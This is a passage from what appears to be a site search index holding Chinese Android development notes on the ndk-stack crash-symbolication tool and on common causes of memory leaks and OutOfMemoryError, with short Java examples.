'armeabi' by default). You can feed the logcat text either as direct input to the program, e.g.: adb logcat | $NDK/ndk-stack -sym $PROJECT_PATH/obj/local/armeabi Or you can use the -dump option to specify the logcat as an input file, e.g.: adb logcat > /tmp/foo.txt $NDK/ndk-stack -sym $PROJECT_PATH/obj/local/armeabi -dump foo.txt TODO: ----- A future version of 'ndk-stack' will try to launch 'adb logcat' and select thelibrary path automatically. For now, you'll have to do these steps manually. As of now, ndk-stack doesn't handle libraries that don't have debug informationin them. It may be useful to try to detect the nearest function entry point to a given PC address (e.g. as in the libc.so example above). \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/oldmtn/article/details/8889654","title":"Android\u00a0ndk-stack\u00a0tool"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/","text":"android\u624b\u673a\u7ed9\u5e94\u7528\u5206\u914d\u7684\u5185\u5b58\u901a\u5e38\u662f8\u5146\u5de6\u53f3\uff0c\u5982\u679c\u5904\u7406\u5185\u5b58\u5904\u7406\u4e0d\u5f53\u5f88\u5bb9\u6613\u9020\u6210OutOfMemoryError\uff0c\u6211\u4eec\u7684\u4ea7\u54c1\u51fa\u73b0\u6700\u591a\u7684\u9519\u8bef\u4e5f\u662fOutOfMemoryError\u7684\u5f02\u5e38\uff0c \u5728\u89e3\u51b3\u8fd9\u4e2a\u5f02\u5e38\u65f6\u5728\u7f51\u4e0a\u53d1\u73b0\u5f88\u591a\u5173\u4e8eOutOfMemoryError\u7684\u539f\u56e0\u7684\u4ecb\u7ecd\u3002 OutOfMemoryError\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u9020\u6210\uff1a 1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002 \u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002 2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002 \u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511 3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver(). \u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. } 4.\u672a\u5173\u95edInputStream/OutputStream\u3002 \u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41 5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002 \u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options); 6.Context\u6cc4\u6f0f\u3002 \u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002 7.static\u5173\u952e\u5b57 \u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"Android\u5185\u5b58\u6cc4\u9732\u4f18\u5316\u603b\u7ed3"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#1cursor","text":"\u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002","title":"1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#2adaptercontentview","text":"\u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511","title":"2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#3registerreceiverunregisterreceiver","text":"\u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. }","title":"3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver()."},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#4inputstreamoutputstream","text":"\u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41","title":"4.\u672a\u5173\u95edInputStream/OutputStream\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#5bitmaprecycle","text":"\u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options);","title":"5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#6context","text":"\u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002","title":"6.Context\u6cc4\u6f0f\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#7static","text":"\u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"7.static\u5173\u952e\u5b57"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/","text":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1 \u524d\u8a00\uff1a 